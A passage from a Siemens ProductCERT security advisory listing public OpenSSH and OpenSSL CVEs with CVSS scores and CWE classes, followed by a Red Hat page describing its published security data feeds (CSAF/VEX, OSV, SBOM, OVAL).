CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:N/E:P/RL:O/RC:C
CWE-787: Out-of-bounds Write

Vulnerability CVE-2016-1907

The ssh_packet_read_poll2 function in packet.c in OpenSSH before 7.1p2 allows remote attackers to
cause a denial of service (out-of-bounds read and application crash) via crafted network trafc.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2016-1908

The client in OpenSSH before 7.2 mishandles failed cookie generation for untrusted X11 forwarding
and relies on the local X11 server for access-control decisions, which allows remote X11 clients to
trigger a fallback and obtain trusted X11 forwarding privileges by leveraging conguration issues on
this X11 server, as demonstrated by lack of the SECURITY extension on this X11 server.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-287: Improper Authentication

SSA-412672

 Siemens 2022

Page 11 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-2105

Integer overow in the EVP_EncodeUpdate function in crypto/evp/encode.c in OpenSSL before 1.0.1t
and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service (heap memory corruption)
via a large amount of binary data.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-190: Integer Overow or Wraparound

Vulnerability CVE-2016-2106

Integer overow in the EVP_EncryptUpdate function in crypto/evp/evp_enc.c in OpenSSL before
1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service (heap memory
corruption) via a large amount of data.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-190: Integer Overow or Wraparound

Vulnerability CVE-2016-2107

The AES-NI implementation in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h does not consider
memory allocation during a certain padding check, which allows remote attackers to obtain sensitive
cleartext information via a padding-oracle attack against an AES CBC session. NOTE: this vulnerability
exists because of an incorrect x for CVE-2013-0169.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-2108

The ASN.1 implementation in OpenSSL before 1.0.1o and 1.0.2 before 1.0.2c allows remote attackers
to execute arbitrary code or cause a denial of service (buffer underow and memory corruption) via an
ANY eld in crafted serialized data, aka the negative zero issue.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2016-2109

The asn1_d2i_read_bio function in crypto/asn1/a_d2i_fp.c in the ASN.1 BIO implementation in
OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service
(memory consumption) via a short invalid encoding.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

SSA-412672

 Siemens 2022

Page 12 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-2176

The X509_NAME_oneline function in crypto/x509/x509_obj.c in OpenSSL before 1.0.1t and 1.0.2
before 1.0.2h allows remote attackers to obtain sensitive information from process stack memory or
cause a denial of service (buffer over-read) via crafted EBCDIC ASN.1 data.

CVSS v3.1 Base Score
CVSS Vector
CWE

8.2
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2016-2177

OpenSSL through 1.0.2h incorrectly uses pointer arithmetic for heap-buffer boundary checks, which
might allow remote attackers to cause a denial of service (integer overow and application crash) or
possibly have unspecied other impact by leveraging unexpected malloc behavior, related to s3_srvr.c,
ssl_sess.c, and t1_lib.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-190: Integer Overow or Wraparound

Vulnerability CVE-2016-2178

The dsa_sign_setup function in crypto/dsa/dsa_ossl.c in OpenSSL through 1.0.2h does not properly
ensure the use of constant-time operations, which makes it easier for local users to discover a DSA
private key via a timing side-channel attack.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.5
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-203: Observable Discrepancy

Vulnerability CVE-2016-2179

The DTLS implementation in OpenSSL before 1.1.0 does not properly restrict the lifetime of queue
entries associated with unused out-of-order messages, which allows remote attackers to cause a
denial of service (memory consumption) by maintaining many crafted DTLS sessions simultaneously,
related to d1_lib.c, statem_dtls.c, statem_lib.c, and statem_srvr.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

Vulnerability CVE-2016-2180

The TS_OBJ_print_bio function in crypto/ts/ts_lib.c in the X.509 Public Key Infrastructure Time-Stamp
Protocol (TSP) implementation in OpenSSL through 1.0.2h allows remote attackers to cause a denial
of service (out-of-bounds read and application crash) via a crafted time-stamp le that is mishandled
by the openssl ts command.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-125: Out-of-bounds Read

SSA-412672

 Siemens 2022

Page 13 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-2181

The Anti-Replay feature in the DTLS implementation in OpenSSL before 1.1.0 mishandles early
use of a new epoch number in conjunction with a large sequence number, which allows remote
attackers to cause a denial of service (false-positive packet drops) via spoofed DTLS records, related
to rec_layer_d1.c and ssl3_record.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-682: Incorrect Calculation

Vulnerability CVE-2016-2182

The BN_bn2dec function in crypto/bn/bn_print.c in OpenSSL before 1.1.0 does not properly validate
division results, which allows remote attackers to cause a denial of service (out-of-bounds write and
application crash) or possibly have unspecied other impact via unknown vectors.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-787: Out-of-bounds Write

Vulnerability CVE-2016-2183

The DES and Triple DES ciphers, as used in the TLS, SSH, and IPSec protocols and other protocols
and products, have a birthday bound of approximately four billion blocks, which makes it easier for
remote attackers to obtain cleartext data via a birthday attack against a long-duration encrypted
session, as demonstrated by an HTTPS session using Triple DES in CBC mode, aka a Sweet32
attack.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-6210

sshd in OpenSSH before 7.3, when SHA256 or SHA512 are used for user password hashing, uses
BLOWFISH hashing on a static password when the username does not exist, which allows remote
attackers to enumerate users by leveraging the timing difference between responses when a large
password is provided.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C
CWE-200: Exposure of Sensitive Information to an Unauthorized
Actor

Vulnerability CVE-2016-6302

The tls_decrypt_ticket function in ssl/t1_lib.c in OpenSSL before 1.1.0 does not consider the HMAC
size during validation of the ticket length, which allows remote attackers to cause a denial of service
via a ticket that is too short.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

SSA-412672

 Siemens 2022

Page 14 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-6303

Integer overow in the MDC2_Update function in crypto/mdc2/mdc2dgst.c in OpenSSL before 1.1.0
allows remote attackers to cause a denial of service (out-of-bounds write and application crash) or
possibly have unspecied other impact via unknown vectors.

CVSS v3.1 Base Score
CVSS Vector
CWE

9.8
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-787: Out-of-bounds Write

Vulnerability CVE-2016-6304

Multiple memory leaks in t1_lib.c in OpenSSL before 1.0.1u, 1.0.2 before 1.0.2i, and 1.1.0 before
1.1.0a allow remote attackers to cause a denial of service (memory consumption) via large OCSP
Status Request extensions.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-401: Missing Release of Memory after Effective Lifetime

Vulnerability CVE-2016-6305

The ssl3_read_bytes function in record/rec_layer_s3.c in OpenSSL 1.1.0 before 1.1.0a allows remote
attackers to cause a denial of service (innite loop) by triggering a zero-length record in an SSL_peek
call.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2016-6306

The certicate parser in OpenSSL before 1.0.1u and 1.0.2 before 1.0.2i might allow remote attackers
to cause a denial of service (out-of-bounds read) via crafted certicate operations, related to s3_clnt.c
and s3_srvr.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-125: Out-of-bounds Read

Vulnerability CVE-2016-6307

The state-machine implementation in OpenSSL 1.1.0 before 1.1.0a allocates memory before checking
for an excessive length, which might allow remote attackers to cause a denial of service (memory
consumption) via crafted TLS messages, related to statem/statem.c and statem/statem_lib.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-400: Uncontrolled Resource Consumption

Vulnerability CVE-2016-6308

statem/statem_dtls.c in the DTLS implementation in OpenSSL 1.1.0 before 1.1.0a allocates memory
before checking for an excessive length, which might allow remote attackers to cause a denial of
service (memory consumption) via crafted DTLS messages.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

SSA-412672

 Siemens 2022

Page 15 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-6515

The auth_password function in auth-passwd.c in sshd in OpenSSH before 7.3 does not limit password
lengths for password authentication, which allows remote attackers to cause a denial of service (crypt
CPU consumption) via a long string.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-20: Improper Input Validation

Vulnerability CVE-2016-8858

DISPUTED The kex_input_kexinit function in kex.c in OpenSSH 6.x and 7.x through 7.3 allows remote
attackers to cause a denial of service (memory consumption) by sending many duplicate KEXINIT
requests. NOTE: a third party reports that OpenSSH upstream does not consider this as a security
issue.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.5
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C
CWE-399: Resource Management Errors

Vulnerability CVE-2016-10009

Untrusted search path vulnerability in ssh-agent.c in ssh-agent in OpenSSH before 7.4 allows remote
attackers to execute arbitrary local PKCS#11 modules by leveraging control over a forwarded agent-
socket.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:U/RL:O/RC:C
CWE-426: Untrusted Search Path

Vulnerability CVE-2016-10010

sshd in OpenSSH before 7.4, when privilege separation is not used, creates forwarded Unix-domain
sockets as root, which might allow local users to gain privileges via unspecied vectors, related to
serverloop.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.0
CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

Vulnerability CVE-2016-10011

authle.c in sshd in OpenSSH before 7.4 does not properly consider the effects of realloc on buffer
contents, which might allow local users to obtain sensitive private-key information by leveraging access
to a privilege-separated child process.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.5
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:U/RL:O/RC:C
CWE-264: Permissions, Privileges, and Access Controls

SSA-412672

 Siemens 2022

Page 16 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2016-10012

The shared memory manager (associated with pre-authentication compression) in sshd in OpenSSH
before 7.4 does not ensure that a bounds check is enforced by all compilers, which might allows local
users to gain privileges by leveraging access to a sandboxed privilege-separation process, related to
the m_zback and m_zlib data structures.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.8
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2017-3735

While parsing an IPAddressFamily extension in an X.509 certicate, it is possible to do a one-byte
overread. This would result in an incorrect text display of the certicate. This bug has been present
since 2006 and is present in all versions of OpenSSL before 1.0.2m and 1.1.0g.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:P/RL:O/RC:C
CWE-119: Improper Restriction of Operations within the Bounds of a
Memory Buffer

Vulnerability CVE-2017-15906

The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write
operations in readonly mode, which allows attackers to create zero-length les.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N/E:U/RL:O/RC:C
CWE-732: Incorrect Permission Assignment for Critical Resource

Vulnerability CVE-2018-15473

OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an
invalid authenticating user until after the packet containing the request has been fully parsed, related
to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N/E:U/RL:O/RC:C
CWE-362: Concurrent Execution using Shared Resource with Im-
proper Synchronization (Race Condition)

Vulnerability CVE-2018-20685

In OpenSSH 7.9, scp.c in the scp client allows remote SSH servers to bypass intended access
restrictions via the lename of . or an empty lename. The impact is modifying the permissions of the
target directory on the client side.

CVSS v3.1 Base Score
CVSS Vector
CWE

5.3
CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N/E:P/RL:O/RC:C
CWE-863: Incorrect Authorization

SSA-412672

 Siemens 2022

Page 17 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2019-1552

OpenSSL has internal defaults for a directory tree where it can nd a conguration le as well as
certicates used for verication in TLS. This directory is most commonly referred to as OPENSSLDIR,
and is congurable with the prex / openssldir conguration options. For OpenSSL versions 1.1.0
and 1.1.1, the mingw conguration targets assume that resulting programs and libraries are installed
in a Unix-like environment and the default prex for program installation as well as for OPENSSLDIR
should be /usr/local. However, mingw programs are Windows programs, and as such, nd themselves
looking at sub-directories of C:/usr/local, which may be world writable, which enables untrusted users
to modify OpenSSLs default conguration, insert CA certicates, modify (or even replace) existing
engine modules, etc. For OpenSSL 1.0.2, /usr/local/ssl is used as default for OPENSSLDIR on
all Unix and Windows targets, including Visual C builds. However, some build instructions for the
diverse Windows targets on 1.0.2 encourage you to specify your own prex. OpenSSL versions
1.1.1, 1.1.0 and 1.0.2 are affected by this issue. Due to the limited scope of affected deployments this
has been assessed as low severity and therefore we are not creating new releases at this time. Fixed
in OpenSSL 1.1.1d (Affected 1.1.1-1.1.1c). Fixed in OpenSSL 1.1.0l (Affected 1.1.0-1.1.0k). Fixed in
OpenSSL 1.0.2t (Affected 1.0.2-1.0.2s).

CVSS v3.1 Base Score
CVSS Vector
CWE

3.3
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N/E:P/RL:O/RC:C
CWE-295: Improper Certicate Validation

Vulnerability CVE-2019-6109

An issue was discovered in OpenSSH 7.9. Due to missing character encoding in the progress display,
a malicious server (or Man-in-The-Middle attacker) can employ crafted object names to manipulate
the client output, e.g., by using ANSI control codes to hide additional les being transferred. This
affects refresh_progress_meter() in progressmeter.c.

CVSS v3.1 Base Score
CVSS Vector
CWE

6.8
CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N/E:P/RL:O/RC:C
CWE-116: Improper Encoding or Escaping of Output

Vulnerability CVE-2019-6110

In OpenSSH 7.9, due to accepting and displaying arbitrary stderr output from the server, a malicious
server (or Man-in-The-Middle attacker) can manipulate the client output, for example to use ANSI
control codes to hide additional les being transferred.

CVSS v3.1 Base Score
CVSS Vector
CWE

6.8
CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N/E:P/RL:O/RC:C
CWE-838: Inappropriate Encoding for Output Context

Vulnerability CVE-2019-6111

An issue was discovered in OpenSSH 7.9. Due to the scp implementation being derived from 1983 rcp,
the server chooses which les/directories are sent to the client. However, the scp client only performs
cursory validation of the object name returned (only directory traversal attacks are prevented). A
malicious scp server (or Man-in-The-Middle attacker) can overwrite arbitrary les in the scp client
target directory. If recursive operation (-r) is performed, the server can manipulate subdirectories as
well (for example, to overwrite the .ssh/authorized_keys le).

CVSS v3.1 Base Score
CVSS Vector
CWE

5.9
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N/E:P/RL:O/RC:C
CWE-22: Improper Limitation of a Pathname to a Restricted Directory
(Path Traversal)

SSA-412672

 Siemens 2022

Page 18 of 19

Siemens Security Advisory by Siemens ProductCERT

Vulnerability CVE-2019-16905

OpenSSH 7.7 through 7.9 and 8.x before 8.1, when compiled with an experimental key type, has a
pre-authentication integer overow if a client or server is congured to use a crafted XMSS key. This
leads to memory corruption and local code execution because of an error in the XMSS key parsing
algorithm. NOTE: the XMSS implementation is considered experimental in all released OpenSSH
versions, and there is no supported way to enable it when building portable OpenSSH.

CVSS v3.1 Base Score
CVSS Vector
CWE

7.8
CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C
CWE-190: Integer Overow or Wraparound

ADDITIONAL INFORMATION

For further inquiries on security vulnerabilities in Siemens products and solutions, please contact the
Siemens ProductCERT:

https://www.siemens.com/cert/advisories

HISTORY DATA

V1.0 (2022-12-13):

Publication Date

TERMS OF USE

Siemens Security Advisories are subject to the terms and conditions contained in Siemens underlying
license terms or other applicable agreements previously agreed to with Siemens (hereinafter "License
Terms"). To the extent applicable to information, software or documentation made available in or through
a Siemens Security Advisory, the Terms of Use of Siemens Global Website (https://www.siemens.com/
terms_of_use, hereinafter "Terms of Use"), in particular Sections 8-10 of the Terms of Use, shall apply
additionally. In case of conicts, the License Terms shall prevail over the Terms of Use.

SSA-412672

 Siemens 2022

Page 19 of 19



=== Content from www.redhat.com_2cbad41c_20250126_080149.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)

  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Product Documentation](https://access.redhat.com/documentation)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)

  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform)
  [All Product Docs](//docs.redhat.com/en/products/)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)

  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Classifications](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Severety Ratings](https://access.redhat.com/security/security-updates/#/cve)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)

  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

 Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Franais](https://access.redhat.com/changeLanguage?language=fr)
* [](https://access.redhat.com/changeLanguage?language=ko)
* [](https://access.redhat.com/changeLanguage?language=ja)
* [ ()](https://access.redhat.com/changeLanguage?language=zh_CN)

# Security Data

Red Hat Product Security is committed to providing tools and security data to help security measurement. A part of this commitment is our active participation in various projects such as the CVE Project, the OASIS CSAF technical committee, or SBOM/VEX forums. We provide the raw data below so customers and researchers can produce their own metrics, for their own unique situations, and hold us accountable. To receive notifications when we fix bugs and add new features, please follow the official [Red Hat Security Data Changelog](https://access.redhat.com/articles/5554431).

The data resources linked on this page as well as their alternative representations available through the [Security Data API](https://access.redhat.com/documentation/en-us/red_hat_security_data_api/1.0/html/red_hat_security_data_api/index) are licensed under the [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/). If you distribute this content or a modified version of it, you must provide attribution to Red Hat, Inc. and provide a link to the original.

**Note:** Security data (CSAF, OVAL, SBOM, and other files) published by Red Hat Product Security was previously served from two locations:

* https://access.redhat.com/security/data/\*
* https://www.redhat.com/security/data/\*

A new domain was recently created the scope of which (for the time being) is to serve this same data:

* https://security.access.redhat.com/data/\*

Effective Sep 3, 2024, a redirect was put in place for all traffic from *www.redhat.com/security/data/\** to be redirected to the new *security.access.redhat.com/data/\** domain. On Sep 30, a similar change was made for *access.redhat.com/security/data/\** to redirect to *security.access.redhat.com/data/*. No change to the actual files or directory layout under the *data/\** path was made. You can start consuming from the new domain today. For example: <https://access.redhat.com/security/data/csaf/v2/vex/2024/cve-2024-0151.json> is now available at <https://security.access.redhat.com/data/csaf/v2/vex/2024/cve-2024-0151.json>; on Sep 30, the former began redirecting to the latter.

### CSAF/VEX Documents

The Common Security Advisory Framework (CSAF) standard enables organizations to share information about security issues using a consistent and common format. We provide Red Hat security advisories in CSAF format using the VEX profile as well as per-CVE VEX documents that contains information on both fixed and unfixed products/components.

* [CSAF GA announcement post](https://www.redhat.com/en/blog/csaf-vex-documents-now-generally-available)
  + [Link to CSAF advisories](https://security.access.redhat.com/data/csaf/v2/advisories/)
* [VEX files for CVEs GA announcement post](https://www.redhat.com/en/blog/red-hat-vex-files-cves-are-now-generally-available%20)
  + [Link to CSAF VEX per-CVE files](https://security.access.redhat.com/data/csaf/v2/vex/)

### OSV Records

[Red Hat / OSV.dev announcement on OpenSSF](https://openssf.org/blog/2024/11/01/red-hats-collaboration-with-the-openssf-and-osv-dev-yields-results-red-hat-security-data-now-available-in-the-osv-format/%20). The CSAF advisory data for RPMs is convertered to OSV records and shared with OSV.dev. It is expected that customers will consume this data from OSV.dev not directly from this URL. This is the location OSV.dev consumes the data from.

* [Link to Red Hat OSV data](https://security.access.redhat.com/data/osv/all.json)

### SBOM Documents

Software Bill of Materials (SBOM) is a complete list of components, their versions, licensing information, provenance, and other metadata for a given product. Red Hat publishes SBOM documents for select products at:

* [Link to SBOM documents](https://security.access.redhat.com/data/sbom/beta/spdx/)

### OVAL Definitions

**Note: OVAL/DS v1 files are no longer available and have been archived; see [OVAL v1 deprecation announcement](https://access.redhat.com/OVAL_v1_deprecation_announcement) for more information.**

OVAL definitions are available for vulnerabilities that were addressed in errata for Red Hat Enterprise Linux and select additional products. To completely evaluate your system you will need to evaluate it against the streams for all products installed on that system.

* [OVAL compatibility FAQ](https://access.redhat.com/articles/221883)
* [OVAL Streams directory](https://security.access.redhat.com/data/oval/v2/)
* [SCAP source data stream files](https://security.access.redhat.com/data/metrics/ds/v2/)

### Vulnerability Metadata

#### Repository to CPE Mapping

Used for matching [OVAL security data to installed RPMs](https://www.redhat.com/en/blog/how-accurately-match-oval-security-data-installed-rpms). Each repository also includes a set of relative URLs from where the content of the repository can be downloaded.

* [repository-to-cpe.json](https://security.access.redhat.com/data/meta/v1/repository-to-cpe.json)

#### RHSA RSS feed

An RSS feed that contains a list of Red Hat security advisories released in the last three days.

* [rhsa.rss](https://security.access.redhat.com/data/meta/v1/rhsa.rss)

#### CPE Dictionary

CPE is a structured naming scheme for information technology systems, software, and packages. For reference, we provide a dictionary mapping the CPE names we use, to Red Hat product descriptions. Some of these CPE names will be for new products that are not in the official CPE dictionary, and should therefore be treated as temporary CPE names:

* [cpe-dictionary.xml](https://security.access.redhat.com/data/meta/v1/cpe-dictionary.xml)

### Security Data Archive

Security data files that have been retired are available in an archive. Each file is marked with a date (YYYYMMDD) when it was last updated:

* [Link to Security Data archive](https://security.access.redhat.com/data/archive/)

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com)

### Help

* [Contact Customer Portal](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
